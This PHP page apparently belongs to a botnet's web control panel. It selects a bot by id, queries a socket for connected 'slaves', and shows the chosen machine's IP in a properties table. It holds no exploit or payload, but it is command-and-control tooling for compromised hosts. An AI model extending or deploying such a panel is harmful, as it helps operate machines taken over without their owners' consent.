<?php

if (isset($_GET ['id'])) {
	$id = $_GET ['id'];
} else {
	die("No bot selected");
}

require_once "request.php";

$request = new Request();
$sock = $request->createSocket();
$slaves = $request->getSlaves($sock);

foreach ($slaves as $aslave) {
	if ($aslave->getUniqueId() == $id) {
		$slave = $aslave;
	}
}

$request->disconnect($sock);

if (!isset($slave)) {
	require_once "slave.php";
	$slave = Slave::none();
}

require "layout/header.php";

?>

<section class="wrapper scrollable">
	<?php require "layout/menubar.php"; ?>
	<br>
	<div class="col-md-3">
		<div class="panel panel-default panel-block">
			<div class="list-group">
				<div class="list-group-item">
					<div class="form-group">
						<h4 class="section-title">Properties</h4>
						<table class="table table-bordered table-striped">
							<thead class="">
								<tr>
									<th>Key</th>
									<th>Value</th>
								</tr>
							</thead>
							<tbody>
							<?php 
								function printTableData($string) {
									if ($string == "Nothing found") {
										echo "<td><b><font color='#ff0000'>$string</font></b></td>";
									} else {
										echo "<td>" . $string . "</td>";
									}
								}
							?>
								<tr>
									<td>IP</td>
									<?php echo printTableData($slave->getIP()); ?>
								</tr>


							</tbody>
						</table>

<?php
	require "layout/footer.php";
?>